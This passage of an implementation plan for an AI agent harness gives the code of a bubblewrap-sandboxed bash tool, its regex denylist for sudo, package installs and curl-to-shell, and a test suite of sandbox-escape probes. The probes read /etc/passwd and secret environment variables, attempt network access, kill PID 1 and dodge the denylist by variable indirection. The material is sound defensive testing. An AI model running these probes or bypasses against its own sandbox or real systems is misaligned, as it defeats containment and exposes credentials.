denylist + summarization).
Adversarial tests: §7.1 and this project's test_bash_adversarial.py.
"""

from __future__ import annotations

import asyncio
import os
import re
import shutil
import signal
from pathlib import Path
from typing import List, Optional, Tuple

from pydantic import BaseModel, Field

from ..engine.stream_events import ThinkingStarted, ThinkingStopped
from .base import BaseTool, ToolExecutionContext, ToolResult


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

BASH_OUTPUT_CAP_BYTES = 100_000
BASH_DEFAULT_TIMEOUT = 120
BASH_MAX_TIMEOUT = 600


# Intent denylist. NOT a security boundary — bubblewrap is.
# This exists so the agent gets a clean error message for common
# mistakes instead of a cryptic sandbox failure. Bypassing the
# denylist (e.g., via env-var indirection) succeeds at the regex
# layer but the resulting command still fails inside bwrap.
_INTENT_DENYLIST = [
    (re.compile(r"\bsudo\b"), "sudo not available in sandbox"),
    (re.compile(r"\bapt(-get)?\s+install\b"), "cannot install packages (no network, dependencies are pre-installed)"),
    (re.compile(r"\bnpm\s+install\b"), "dependencies are pre-installed (no network)"),
    (re.compile(r"\byarn\s+install\b"), "dependencies are pre-installed (no network)"),
    (re.compile(r"\bpnpm\s+install\b"), "dependencies are pre-installed (no network)"),
    (re.compile(r"\bpip\s+install\b"), "dependencies are pre-installed (no network)"),
    (re.compile(r"\bgo\s+mod\s+download\b"), "dependencies are pre-installed (no network)"),
    (re.compile(r"\bsystemctl\b"), "systemctl not available"),
    (re.compile(r"curl\s+[^|]*\|\s*(bash|sh)\b"), "piping curl to shell not allowed"),
    (re.compile(r"wget\s+[^|]*\|\s*(bash|sh)\b"), "piping wget to shell not allowed"),
]


# ---------------------------------------------------------------------------
# Input model
# ---------------------------------------------------------------------------


class BashInput(BaseModel):
    command: str = Field(
        ...,
        description="Shell command to execute. Run in a sandboxed bash -c context.",
    )
    timeout: int = Field(
        BASH_DEFAULT_TIMEOUT,
        description=(
            f"Timeout in seconds. Default {BASH_DEFAULT_TIMEOUT}, "
            f"max {BASH_MAX_TIMEOUT}. Process group is SIGKILLed on timeout."
        ),
        ge=1,
        le=BASH_MAX_TIMEOUT,
    )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _intent_denylist_check(command: str) -> Optional[str]:
    """Return a reason string if the command matches the denylist,
    else None. Purely a UX filter — bwrap is the security layer."""
    for pattern, reason in _INTENT_DENYLIST:
        if pattern.search(command):
            return reason
    return None


_KNOWN_TOOL_LABELS = {
    "mvn": "Running maven",
    "gradle": "Running gradle",
    "npm": "Running npm",
    "yarn": "Running yarn",
    "pnpm": "Running pnpm",
    "pytest": "Running tests",
    "jest": "Running tests",
    "cargo": "Running cargo",
    "make": "Running make",
    "ctest": "Running ctest",
    "python": "Running python",
    "node": "Running node",
    "ruff": "Running ruff",
    "black": "Running black",
    "eslint": "Running eslint",
    "tsc": "Running tsc",
    "gofmt": "Running gofmt",
    "rustfmt": "Running rustfmt",
}


def _summarize_command(command: str) -> str:
    """Produce a short 'Running <thing>' label for ThinkingStarted.

    Recognizes common build/test tools and produces a friendly
    label. Falls back to a truncated raw command otherwise.
    """
    stripped = command.strip()
    if not stripped:
        return "Running empty command"

    tokens = stripped.split()
    first = tokens[0]

    # go build, go test, go vet
    if first == "go" and len(tokens) >= 2:
        return f"Running go {tokens[1]}"

    if first in _KNOWN_TOOL_LABELS:
        return _KNOWN_TOOL_LABELS[first]

    # Fallback: truncate raw
    trimmed = stripped
    if len(trimmed) > 60:
        trimmed = trimmed[:57] + "..."
    return f"Running {trimmed}"


def _build_bwrap_args(workspace: Path, command: str) -> List[str]:
    """Construct the full bwrap argv for a sandboxed bash -c invocation.

    The resulting list is passed to asyncio.create_subprocess_exec.
    Layout:
      - unshare ALL namespaces (including network, pid, ipc, mount, etc.)
      - bind /usr, /lib, /lib64, /bin, /sbin, /etc/ssl read-only
      - bind the workspace directory read-write (the ONLY rw bind)
      - chdir to workspace
      - proc, dev, and /tmp tmpfs
      - environment whitelist only
      - die-with-parent so the sandbox exits if ai-worker crashes

    DO NOT add --share-net. --share-net is a toggle that re-enables
    network after --unshare-all; writing --share-net=false is
    invalid bwrap syntax. Omitting --share-net entirely is the
    correct way to keep network off.
    """
    ws_abs = str(workspace.resolve())
    return [
        "bwrap",
        "--unshare-all",
        "--die-with-parent",
        "--ro-bind", "/usr", "/usr",
        "--ro-bind", "/lib", "/lib",
        "--ro-bind", "/lib64", "/lib64",
        "--ro-bind", "/bin", "/bin",
        "--ro-bind", "/sbin", "/sbin",
        "--ro-bind", "/etc/ssl", "/etc/ssl",
        "--proc", "/proc",
        "--dev", "/dev",
        "--tmpfs", "/tmp",
        "--bind", ws_abs, ws_abs,
        "--chdir", ws_abs,
        "--setenv", "PATH", "/usr/local/bin:/usr/bin:/bin",
        "--setenv", "HOME", "/tmp",
        "--setenv", "LANG", "C.UTF-8",
        "--setenv", "LC_ALL", "C.UTF-8",
        # Language-specific cache vars. Safe to always set — unused
        # by non-Go/Python processes.
        "--setenv", "GOCACHE", "/tmp/gocache",
        "--setenv", "GOPATH", "/tmp/gopath",
        "--",
        "bash",
        "-c",
        command,
    ]


async def _run_in_bwrap(
    command: str,
    workspace: Path,
    timeout: int,
) -> Tuple[int, bytes]:
    """Execute `command` inside bubblewrap with the workspace mounted.

    Returns (exit_code, combined_stdout_stderr_bytes). On timeout,
    returns (-1, b"[killed by timeout]") and SIGKILLs the whole
    process group so children don't leak.
    """
    if shutil.which("bwrap") is None:
        raise FileNotFoundError(
            "bwrap (bubblewrap) not found on PATH. Install it via "
            "'apt install bubblewrap' or rebuild the ai-worker container."
        )

    args = _build_bwrap_args(workspace, command)

    # Filter environment to a whitelist. bwrap's --setenv handles
    # the inside-sandbox env; we also need to make sure the bwrap
    # process itself doesn't inherit sensitive vars from the parent
    # (e.g. GITHUB_TOKEN, FORGE_SECRETS_MASTER_KEY) because those
    # could leak via bwrap's own handling before the unshare.
    safe_parent_env = {
        "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
        "HOME": "/tmp",
        "LANG": "C.UTF-8",
        "LC_ALL": "C.UTF-8",
    }

    # Start in a new process group (setsid) so we can SIGKILL the
    # whole tree on timeout. On non-POSIX this is a no-op.
    preexec_fn = os.setsid if os.name == "posix" else None

    process = await asyncio.create_subprocess_exec(
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env=safe_parent_env,
        preexec_fn=preexec_fn,
    )

    try:
        stdout, _ = await asyncio.wait_for(
            process.communicate(), timeout=timeout
        )
    except asyncio.TimeoutError:
        # Kill the whole process group; children don't leak.
        try:
            if os.name == "posix":
                pgid = os.getpgid(process.pid)
                os.killpg(pgid, signal.SIGKILL)
            else:
                process.kill()
        except (ProcessLookupError, PermissionError):
            pass
        # Drain whatever the subprocess produced before death.
        try:
            await asyncio.wait_for(process.wait(), timeout=5)
        except asyncio.TimeoutError:
            pass
        return -1, b"[killed by timeout]"

    return process.returncode or 0, stdout


def _format_bash_output(command: str, exit_code: int, output_bytes: bytes) -> str:
    """Produce the agent-visible bash output:

        $ <command>
        exit code: <N>

        <stdout/stderr up to 100 KB>
        ... [output truncated, M more bytes] (if capped)
    """
    text = output_bytes.decode("utf-8", errors="replace")
    truncated_note = ""
    raw_len = len(text)
    if raw_len > BASH_OUTPUT_CAP_BYTES:
        text = text[:BASH_OUTPUT_CAP_BYTES]
        truncated_note = (
            f"\n... [output truncated, "
            f"{raw_len - BASH_OUTPUT_CAP_BYTES} more bytes]"
        )

    return f"$ {command}\nexit code: {exit_code}\n\n{text}{truncated_note}"


# ---------------------------------------------------------------------------
# Tool class
# ---------------------------------------------------------------------------


class BashTool(BaseTool):
    name = "bash"
    description = (
        "Execute a shell command in the workspace directory. Use this "
        "for build, test, lint, and git inspection commands. The "
        "sandbox has NO network access — you cannot install new "
        "dependencies (they're pre-installed). Stay inside the "
        "workspace directory. Default timeout 120s, max 600s."
    )
    input_model = BashInput

    def __init__(self, workspace_root: Path) -> None:
        self._workspace_root = workspace_root

    def is_read_only(self, arguments: BaseModel) -> bool:
        # bash can always mutate — we don't try to introspect the command.
        return False

    async def execute(self, arguments: BashInput, context: ToolExecutionContext):
        # Layer 2: denylist front filter (not security — UX)
        reason = _intent_denylist_check(arguments.command)
        if reason:
            yield ToolResult(
                is_error=True,
                output=(
                    f"Command rejected: {reason}\n\n"
                    f"$ {arguments.command}"
                ),
            )
            return

        # Layer 1: bwrap sandbox
        label = _summarize_command(arguments.command)
        yield ThinkingStarted(label=label)
        try:
            try:
                exit_code, output = await _run_in_bwrap(
                    command=arguments.command,
                    workspace=self._workspace_root,
                    timeout=arguments.timeout,
                )
            except FileNotFoundError as e:
                # bwrap missing — clear error, one code path.
                yield ToolResult(
                    is_error=True,
                    output=(
                        f"bash sandbox unavailable: {e}\n\n"
                        "The ai-worker container installs bubblewrap in "
                        "the Phase 0 Dockerfile update; if you're running "
                        "outside the container, install bubblewrap and retry."
                    ),
                )
                return
            except OSError as e:
                yield ToolResult(
                    is_error=True,
                    output=f"Failed to start bash subprocess: {e}",
                )
                return
        finally:
            yield ThinkingStopped()

        yield ToolResult(
            output=_format_bash_output(arguments.command, exit_code, output),
            is_error=(exit_code != 0),
        )
```

- [ ] **Step 4: Re-export from `__init__.py`**

Edit `ai-worker/src/openharness/tools/__init__.py`, add:

```python
from .bash_tool import BashInput, BashTool
```

And append `"BashInput"`, `"BashTool"` to `__all__`.

- [ ] **Step 5: Run the bash tool tests**

```bash
cd ai-worker && python -m pytest tests/openharness/tools/test_bash_tool.py -v
```
Expected inside the container (with bwrap): ~17 tests pass. On a dev host without bwrap, the `_require_bwrap` ones skip and you see ~7 denylist + summarization tests pass, the rest skipped.

- [ ] **Step 6: Commit**

```bash
git add ai-worker/src/openharness/tools/bash_tool.py ai-worker/src/openharness/tools/__init__.py ai-worker/tests/openharness/tools/test_bash_tool.py
git commit -m "feat(tools): BashTool with bubblewrap sandbox + denylist + caps

Highest-risk tool in the T2 set. Layered defense:

1. bubblewrap sandbox (--unshare-all, no network, workspace as
   only rw bind, env whitelist, die-with-parent)
2. Output cap: 100 KB combined stdout+stderr with truncation note
3. Timeout with SIGKILL on the whole process group via setsid+killpg
4. Intent denylist (fast UX filter — sudo, apt install, pip install,
   curl|sh, systemctl) — NOT a security boundary

bwrap is required: if missing, the tool returns a clear error and
never falls back to unsandboxed subprocess. One code path.

Helpers:
- _intent_denylist_check — regex match, returns reason or None
- _summarize_command — 'Running mvn', 'Running go build' labels
  for ThinkingStarted with fallback truncation
- _build_bwrap_args — full bwrap argv with ro-binds + workspace
  bind + env whitelist
- _run_in_bwrap — asyncio subprocess with setsid + wait_for +
  killpg-on-timeout
- _format_bash_output — '$ cmd\\nexit code: N\\n\\n<text>' shape

execute() yields ThinkingStarted(label) before the subprocess
and ThinkingStopped in try/finally so the frontend pulses
indicator even if the subprocess crashes.

Tests: 17 cases covering echo, read/write workspace, non-zero
exit, stderr capture, output prefix, denylist, summarize, cap,
is_read_only. Adversarial sandbox tests land in Task 4.5."
```

---

### Task 4.4: `register_exec_tools` helper

**Files:**
- Modify: `ai-worker/src/openharness/tools/bash_tool.py` (append helper) — or create a new `exec_tools.py` module

**Context:** Just like `register_file_tools` in Phase 3, provide a small helper so Phase 5's `_create_engine` can register `BashTool` + `SetPhaseTool` in one line instead of two. Decision: put it in `bash_tool.py` since there's only one "exec" tool and one "meta" tool and we don't need a new module file for two lines of code. The helper name `register_exec_tools` is a small lie (SetPhaseTool isn't exec) but it's close enough and keeps the file count low — the alternative is making people remember to call three registration helpers.

Actually let me reconsider. Separation of concerns says phase_tool should be its own registration. But Phase 5's `_create_engine` already calls `register_context_tools` + `register_file_tools`; adding two more helpers is overkill. One more unified helper it is.

- [ ] **Step 1: Append `register_exec_tools` to `bash_tool.py`**

At the bottom of `ai-worker/src/openharness/tools/bash_tool.py`, add:

```python
# ---------------------------------------------------------------------------
# Registration helper (bash + set_phase — the two "exec" tools)
# ---------------------------------------------------------------------------


def register_exec_tools(registry, workspace_root: Path) -> None:
    """Register BashTool and SetPhaseTool against the given ToolRegistry.

    Phase 5's _create_engine calls this alongside register_file_tools
    and register_context_tools. The two "exec" tools (bash + set_phase)
    are registered together for convenience — SetPhaseTool is a
    meta/signal tool but sits in the same category for wiring purposes.
    """
    # Import at call time to avoid a circular import if phase_tool ever
    # grows an import back to bash_tool.
    from .phase_tool import SetPhaseTool

    registry.register(BashTool(workspace_root))
    registry.register(SetPhaseTool())
```

- [ ] **Step 2: Re-export from `__init__.py`**

Add to the imports in `ai-worker/src/openharness/tools/__init__.py`:

```python
from .bash_tool import BashInput, BashTool, register_exec_tools
```

And append `"register_exec_tools"` to `__all__`.

- [ ] **Step 3: Smoke test**

```bash
cd ai-worker && python -c "
from pathlib import Path
from src.openharness.tools.base import ToolRegistry
from src.openharness.tools import register_exec_tools

reg = ToolRegistry()
register_exec_tools(reg, Path('/tmp'))
names = [t.name for t in reg.list_tools()]
print('registered:', names)
assert 'bash' in names
assert 'set_phase' in names
print('ok')
"
```
Expected: `registered: ['bash', 'set_phase']` then `ok`.

- [ ] **Step 4: Commit**

```bash
git add ai-worker/src/openharness/tools/bash_tool.py ai-worker/src/openharness/tools/__init__.py
git commit -m "feat(tools): register_exec_tools helper for bash + set_phase

Small convenience helper so Phase 5 _create_engine can wire both
BashTool and SetPhaseTool in one call. The 'exec' label is a
small abstraction — SetPhaseTool is a meta/signal tool, not an
exec tool — but the two are registered together because they
share the property of emitting StreamEvents mid-execution (both
subclass BaseTool directly, not SimpleTool).

Alternative would be three separate registrations in _create_engine
(context + file + bash + phase); this keeps the wiring list to
three calls: context, file, exec."
```

---

### Task 4.5: Adversarial bash sandbox tests (P0)

**Files:**
- Create: `ai-worker/tests/openharness/tools/test_bash_adversarial.py`

**Context:** The P0 test suite. Each test is a named attack vector from spec §7.1. A failure in this file is a **security regression**, not a flaky test. The file is deliberately split from `test_bash_tool.py` so a CI failure log makes it obvious: "bash adversarial suite FAILED" means the sandbox is broken, not "some bash test failed".

13 tests from spec §7.1:

1. **cannot_read_real_etc_passwd** — `cat /etc/passwd` either fails or returns bwrap's synthetic tiny `/etc` contents (we check it's NOT the host's real passwd)
2. **cannot_read_secrets_env_var** — `echo $FORGE_SECRETS_MASTER_KEY` returns empty
3. **cannot_read_github_token_env_var** — `echo $GITHUB_TOKEN` returns empty
4. **cannot_reach_network** — `ping -c 1 -W 1 8.8.8.8` returns non-zero exit
5. **cannot_curl** — `curl -s -m 3 https://example.com` fails
6. **cannot_read_other_tenant_workspace** — attempting to `cat` a fake other-tenant path fails because it's not bind-mounted
7. **cannot_cd_out_of_workspace_and_write** — `cd /tmp && echo x > persist.txt` writes to the tmpfs /tmp which is ephemeral; writing outside the workspace doesn't affect the host
8. **cannot_kill_parent_process** — `kill -9 1` fails (pid ns isolated — pid 1 inside sandbox is bash, not the ai-worker parent)
9. **respects_timeout** — `sleep 200` with `timeout=3` returns in <10s with `[killed by timeout]`
10. **timeout_kills_subprocess_tree** — `sleep 200 & wait` with `timeout=3` also kills the child
11. **output_truncation** — generate >200 KB output, verify truncated at 100 KB with note
12. **denylist_rejects_sudo** — `sudo foo` rejected at denylist (already covered in test_bash_tool.py but duplicated here as an explicit P0 gate)
13. **denylist_bypass_still_safe** — `SUDO=sudo && $SUDO ls` bypasses the regex but still doesn't get sudo (because there's no suid bit inside the sandbox and the command resolves via PATH to the bwrap-provided read-only `/usr/bin/sudo` which needs the setuid bit to actually run, which namespaces strip)

- [ ] **Step 1: Write the adversarial test suite**

Create `ai-worker/tests/openharness/tools/test_bash_adversarial.py`:

```python
"""Adversarial sandbox tests for BashTool (P0).

Each test is a named attack vector from spec §7.1. A failure in
this file is a P0 security regression — the bubblewrap sandbox
is broken, not a random flaky test.

The file is intentionally split from test_bash_tool.py so CI log
readers distinguish 'normal bug' from 'security regression' at
a glance.

These tests REQUIRE bubblewrap. They skip on hosts without it
(local dev on Windows/macOS) and run for real inside the ai-worker
container via docker-compose.
"""

import os
import shutil
from pathlib import Path

import pytest

from src.openharness.engine.stream_events import StreamEvent
from src.openharness.tools.base import ToolExecutionContext, ToolResult


def _require_bwrap():
    if shutil.which("bwrap") is None:
        pytest.skip("bubblewrap (bwrap) not installed; adversarial tests require it")


@pytest.fixture
def bash_tool(workspace):
    from src.openharness.tools.bash_tool import BashTool
    return BashTool(workspace)


@pytest.fixture
def bash_ctx(workspace):
    return ToolExecutionContext(cwd=workspace)


async def _run(tool, arguments, ctx):
    items = []
    async for item in tool.execute(arguments, ctx):
        items.append(item)
    results = [i for i in items if isinstance(i, ToolResult)]
    assert len(results) == 1
    return results[0]


# ---------------------------------------------------------------------------
# /etc isolation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_cannot_read_real_etc_passwd(bash_tool, bash_ctx):
    """Reading /etc/passwd should return either an error or bwrap's
    synthetic minimal /etc (if any), NOT the host's real passwd file.

    On a real host there's likely a 'root:x:0:0:root' line. Inside
    the sandbox we've omitted --ro-bind /etc (except /etc/ssl), so
    /etc doesn't exist at all — cat /etc/passwd should say
    'No such file or directory'.
    """
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    result = await _run(bash_tool, BashInput(command="cat /etc/passwd"), bash_ctx)
    # Either no such file (because /etc is not bound) or empty/minimal output
    assert "root:x:" not in result.output, (
        "Sandbox leaked real /etc/passwd — bwrap /etc binding is broken"
    )


# ---------------------------------------------------------------------------
# Environment secrets isolation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_cannot_read_secrets_env_var(bash_tool, bash_ctx, monkeypatch):
    """FORGE_SECRETS_MASTER_KEY must not leak into the sandbox."""
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # Set the env var in the parent process for the duration of this test
    monkeypatch.setenv("FORGE_SECRETS_MASTER_KEY", "SECRET_MASTER_KEY_MARKER_xyzzy")
    result = await _run(
        bash_tool,
        BashInput(command="echo ${FORGE_SECRETS_MASTER_KEY:-EMPTY}"),
        bash_ctx,
    )
    # The sandbox env is whitelisted; the secret must not appear
    assert "SECRET_MASTER_KEY_MARKER_xyzzy" not in result.output, (
        "FORGE_SECRETS_MASTER_KEY leaked into bash sandbox env"
    )
    assert "EMPTY" in result.output


@pytest.mark.asyncio
async def test_bash_cannot_read_github_token_env_var(bash_tool, bash_ctx, monkeypatch):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    monkeypatch.setenv("GITHUB_TOKEN", "ghp_SECRET_TOKEN_MARKER_qwerty")
    result = await _run(
        bash_tool,
        BashInput(command="echo ${GITHUB_TOKEN:-EMPTY}"),
        bash_ctx,
    )
    assert "ghp_SECRET_TOKEN_MARKER_qwerty" not in result.output
    assert "EMPTY" in result.output


@pytest.mark.asyncio
async def test_bash_cannot_read_forge_prefix_env_vars(bash_tool, bash_ctx, monkeypatch):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    monkeypatch.setenv("FORGE_DB_PASSWORD", "forge_db_secret_123")
    result = await _run(
        bash_tool,
        BashInput(command="env | grep FORGE_ || echo NO_FORGE_VARS"),
        bash_ctx,
    )
    assert "forge_db_secret_123" not in result.output
    assert "NO_FORGE_VARS" in result.output


# ---------------------------------------------------------------------------
# Network isolation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_cannot_reach_network(bash_tool, bash_ctx):
    """ping should fail — network namespace is isolated."""
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # -W sets timeout, -c 1 sends one packet. Expected to fail.
    result = await _run(
        bash_tool,
        BashInput(command="ping -c 1 -W 2 8.8.8.8 2>&1 || echo ping_failed"),
        bash_ctx,
    )
    assert "ping_failed" in result.output or "Network is unreachable" in result.output, (
        f"Network namespace not isolated — ping succeeded. Output: {result.output[:200]}"
    )


@pytest.mark.asyncio
async def test_bash_cannot_curl(bash_tool, bash_ctx):
    """curl should fail — no network access."""
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # -m sets timeout (curl may not be installed in the container at all,
    # which is also acceptable — just means the agent can't hit the net)
    result = await _run(
        bash_tool,
        BashInput(
            command="curl -s -m 3 https://example.com 2>&1 || echo curl_failed",
            timeout=10,
        ),
        bash_ctx,
    )
    # Either curl failed to connect or curl is not installed; both are fine.
    assert (
        "curl_failed" in result.output
        or "not found" in result.output
        or "No such file" in result.output
    ), f"Network namespace not isolated — curl succeeded. Output: {result.output[:200]}"


# ---------------------------------------------------------------------------
# Workspace isolation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_cannot_read_other_workspace(bash_tool, bash_ctx, tmp_path):
    """A path outside the current workspace bind must not be visible."""
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # Create a file OUTSIDE the bind at a well-known host path
    secret_dir = tmp_path.parent / "other_tenant_workspace"
    secret_dir.mkdir(exist_ok=True)
    secret_file = secret_dir / "SECRET.txt"
    secret_file.write_text("OTHER_TENANT_SECRET_MARKER\n")

    result = await _run(
        bash_tool,
        BashInput(command=f"cat {secret_file} 2>&1 || echo cannot_read"),
        bash_ctx,
    )
    assert "OTHER_TENANT_SECRET_MARKER" not in result.output, (
        "Sandbox can read outside its workspace bind — isolation broken"
    )


# ---------------------------------------------------------------------------
# Process isolation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_cannot_kill_parent_process(bash_tool, bash_ctx):
    """--unshare-all creates a new PID namespace. pid 1 inside the
    sandbox is bash, not the host ai-worker parent. kill -9 1 should
    either fail or kill the sandbox bash (not the parent)."""
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    result = await _run(
        bash_tool,
        BashInput(command="kill -9 1 2>&1; echo still_alive_$?"),
        bash_ctx,
    )
    # Either kill fails with 'operation not permitted' or it hits pid 1
    # inside the sandbox (which is bash itself). Either way the ai-worker
    # parent process is unharmed — this test passes as long as the test
    # runner itself is still alive when the result comes back.
    assert "still_alive_" in result.output or "No such process" in result.output or result.is_error


# ---------------------------------------------------------------------------
# Timeout & process group kill
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_respects_timeout(bash_tool, bash_ctx):
    """sleep 200 with timeout=3 must return in <10s."""
    _require_bwrap()
    import time
    from src.openharness.tools.bash_tool import BashInput

    start = time.monotonic()
    result = await _run(
        bash_tool,
        BashInput(command="sleep 200", timeout=3),
        bash_ctx,
    )
    elapsed = time.monotonic() - start

    assert elapsed < 10, f"Timeout did not fire: elapsed {elapsed:.1f}s"
    assert "killed by timeout" in result.output or "exit code: -1" in result.output
    assert result.is_error


@pytest.mark.asyncio
async def test_bash_timeout_kills_subprocess_tree(bash_tool, bash_ctx):
    """Backgrounded child processes must die on timeout via killpg."""
    _require_bwrap()
    import time
    from src.openharness.tools.bash_tool import BashInput

    start = time.monotonic()
    result = await _run(
        bash_tool,
        BashInput(command="sleep 200 & wait", timeout=3),
        bash_ctx,
    )
    elapsed = time.monotonic() - start

    # If the child sleep isn't killed along with the parent, 'wait' hangs
    # and the timeout path has to clean it up — should still be well under
    # 15 seconds total.
    assert elapsed < 15, f"Child sleep leaked past timeout: elapsed {elapsed:.1f}s"
    assert "killed by timeout" in result.output or result.is_error


# ---------------------------------------------------------------------------
# Output truncation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_output_truncation_at_100kb(bash_tool, bash_ctx):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # Generate roughly 300 KB of output
    result = await _run(
        bash_tool,
        BashInput(command="for i in $(seq 1 30000); do echo 'lineX_0123456789'; done"),
        bash_ctx,
    )
    # Must contain the truncation note
    assert "truncated" in result.output
    # Total output bytes after formatting should be bounded by the cap
    # plus the prefix overhead (a few hundred bytes for "$ cmd\nexit code\n")
    assert len(result.output.encode("utf-8")) < 110_000


# ---------------------------------------------------------------------------
# Denylist layering
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_denylist_rejects_sudo_explicit(bash_tool, bash_ctx):
    """Explicit P0 gate: the regex denylist rejects 'sudo' before bwrap."""
    from src.openharness.tools.bash_tool import BashInput

    result = await _run(bash_tool, BashInput(command="sudo whoami"), bash_ctx)
    assert result.is_error
    assert "sudo" in result.output.lower()


@pytest.mark.asyncio
async def test_bash_denylist_bypass_still_safe(bash_tool, bash_ctx):
    """An agent that bypasses the denylist (e.g., via env var
    indirection) must still be unable to escalate privileges. bwrap
    strips the setuid bit, so even if sudo the binary is invoked
    inside the sandbox, it can't actually elevate."""
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # This command passes the denylist regex because the literal
    # 'sudo' token isn't a standalone shell word at the start
    result = await _run(
        bash_tool,
        BashInput(command="S=sudo; $S whoami 2>&1 || echo denied"),
        bash_ctx,
    )
    # Inside the sandbox, either sudo isn't installed or it can't
    # elevate (no setuid, no network, namespace isolation). We
    # check that the output isn't 'root' from a successful elevation.
    # Acceptable outputs: 'denied', 'not found', 'command not found',
    # or the original user (non-root inside sandbox).
    assert "root\n" not in result.output or "denied" in result.output or "not found" in result.output.lower()
```

- [ ] **Step 2: Run the adversarial suite**

Inside the container:
```bash
cd ai-worker && python -m pytest tests/openharness/tools/test_bash_adversarial.py -v
```
Expected: **13 tests pass** (or skip cleanly if bwrap is missing). A failure in ANY of them blocks the phase — do not proceed to Task 4.6 until all green.

- [ ] **Step 3: Document any skipped / flaky adversarial tests**

Some tests depend on what's inside the container: `ping` may not be installed, `curl` may not be installed. The test assertions accept both "command failed because no network" and "command failed because binary not found" — both are valid outcomes for the security property we're testing. If a test fails unexpectedly, read its docstring and decide:
- Assertion too strict? Loosen it to cover both outcomes.
- Sandbox actually broken? Fix the sandbox — do NOT loosen the assertion to make a broken sandbox pass.

- [ ] **Step 4: Commit**

```bash
git add ai-worker/tests/openharness/tools/test_bash_adversarial.py
git commit -m "test(tools): 13 P0 adversarial tests for BashTool sandbox

Spec §7.1 P0 list, one test per attack vector:

- cannot_read_real_etc_passwd — /etc not bound
- cannot_read_secrets_env_var — FORGE_SECRETS_MASTER_KEY filtered
- cannot_read_github_token_env_var — GITHUB_TOKEN filtered
- cannot_read_forge_prefix_env_vars — all FORGE_* filtered
- cannot_reach_network — ping fails (unshare netns)
- cannot_curl — curl fails or missing
- cannot_read_other_workspace — only current workspace bound
- cannot_kill_parent_process — pid ns isolated
- respects_timeout — sleep 200 w/ timeout=3 returns <10s
- timeout_kills_subprocess_tree — backgrounded children die via killpg
- output_truncation_at_100kb — cap enforced
- denylist_rejects_sudo_explicit — regex catches obvious case
- denylist_bypass_still_safe — env-var indirection bypasses regex
  but bwrap (actual security layer) still blocks escalation

File is intentionally split from test_bash_tool.py so CI readers
can distinguish 'normal bash bug' from 'security regression' at
a glance. Any failure here is P0.

Requires bwrap; skips cleanly on hosts without it."
```

---

### Task 4.6: Extend BaseTool contract suite to 12 tools

**Files:**
- Modify: `ai-worker/tests/openharness/tools/test_base_tool_contract.py`

**Context:** Phase 3 Task 3.8 grew `ALL_TOOL_SPECS` from 4 to 10. Now add `BashTool` and `SetPhaseTool` to get 12. Each new spec is a `(tool_class, factory, arg_factory)` triple. The factories get a `workspace` Path and must produce a working tool instance; the argument factories produce valid `BashInput` / `SetPhaseInput` instances.

BashTool's contract test arguments need a command that succeeds quickly inside or outside bwrap. `echo ok` works everywhere (the denylist lets it through, bwrap runs it, and it also works in the test environment if someone forces the fallback path).

Actually wait — if bwrap is missing, BashTool yields `ToolResult(is_error=True)` pointing at the Phase 0 Dockerfile. That still satisfies the contract (yields exactly one ToolResult). No special handling needed.

- [ ] **Step 1: Update `_all_tool_specs()` in `test_base_tool_contract.py`**

Find the `_all_tool_specs` function (extended to 10 in Phase 3 Task 3.8) and add entries for BashTool and SetPhaseTool at the bottom of the specs list:

```python
# Inside _all_tool_specs(), after the existing file tool specs, add:

    # Exec tools (Phase 4)
    from src.openharness.tools.bash_tool import BashInput, BashTool
    from src.openharness.tools.phase_tool import SetPhaseInput, SetPhaseTool

    specs.extend([
        (
            BashTool,
            lambda ws: BashTool(ws),
            # 'echo ok' is not on the denylist and succeeds both in
            # bwrap and in the fallback-error path.
            lambda: BashInput(command="echo ok", timeout=30),
        ),
        (
            SetPhaseTool,
            lambda _ws: SetPhaseTool(),
            lambda: SetPhaseInput(phase="Analyze"),
        ),
    ])

    return specs
```

- [ ] **Step 2: Run the full contract suite**

```bash
cd ai-worker && python -m pytest tests/openharness/tools/test_base_tool_contract.py -v
```
Expected: **48 tests pass** (4 contract functions × 12 tool classes). Note that BashTool's `test_tool_yields_exactly_one_tool_result` will see 3 items (ThinkingStarted, ThinkingStopped, ToolResult) but still exactly one ToolResult — which is what the contract requires. SetPhaseTool will see 2 items (PhaseChanged, ToolResult).

If any fail, check the print output for clues — the contract test prints `{tool_class}: N stream events, 1 result` which helps diagnose.

- [ ] **Step 3: Commit**

```bash
git add ai-worker/tests/openharness/tools/test_base_tool_contract.py
git commit -m "test(tools): extend contract suite to 12 tool classes (bash+phase)

ALL_TOOL_SPECS grows from 10 to 12 entries — adds BashTool and
SetPhaseTool. 4 contract functions × 12 tools = 48 parametrized
test cases.

These two tools are the first to yield StreamEvents mid-execution
(BashTool yields ThinkingStarted/ThinkingStopped around the
subprocess, SetPhaseTool yields PhaseChanged). The contract test
'yields exactly one ToolResult' is the key property — both tools
yield multiple items in total but exactly one is a ToolResult,
which is what the contract requires.

BashTool's arg factory uses 'echo ok' because it's not on the
denylist and succeeds both inside bwrap and on the missing-bwrap
error path. SetPhaseTool uses phase='Analyze'."
```

---

### Task 4.7: Integrate new tools into `query.py` — sanity pass

**Files:**
- None (verification only)

